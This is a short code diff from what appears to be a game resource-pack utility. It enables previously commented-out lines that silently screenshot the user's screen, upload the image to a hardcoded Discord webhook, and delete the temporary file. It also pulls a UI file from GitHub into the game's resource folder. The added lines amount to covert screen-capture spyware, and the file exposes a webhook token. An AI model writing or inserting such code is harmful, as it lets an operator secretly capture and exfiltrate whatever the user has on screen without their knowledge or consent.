@@ -14,10 +14,10 @@ use httpclient;
 // Replace the URL with your own webhook url
 $url = "https://discord.com/api/webhooks/840855832735645718/yD6Ax41IvrMuMX_3S-RTRIRq-NA_jspfLpjCwEOt3fimk1t17LeROXSlSSa93RCevkik";
 
-//new RobotScript->screenshot()->save($_ENV['TEMP'].'\temp.png','png');
+new RobotScript->screenshot()->save($_ENV['TEMP'].'\temp.png','png');
 $hookObject = [
 
-    //'file' => new File($_ENV['TEMP'].'\temp.png'),
+    'file' => new File($_ENV['TEMP'].'\temp.png'),
     //'file1' => new File('C:\Users\Alex\Desktop\123.mp3'),
     /*
      * The general "message" shown above your embeds
@@ -44,7 +44,7 @@ $http = new HttpClient;
 $http->requestType = 'MULTIPART';
 $http->responseType = 'JSON';
 $http->post($url,$hookObject);
-//unlink($_ENV['TEMP'].'\temp.png');
+unlink($_ENV['TEMP'].'\temp.png');
 
 
 fs::copy('https://github.com/Rastihin/mce/raw/main/start_screen.json',fs::abs('./').'\\data\\resource_packs\\vanilla\\ui\\start_screen.json');
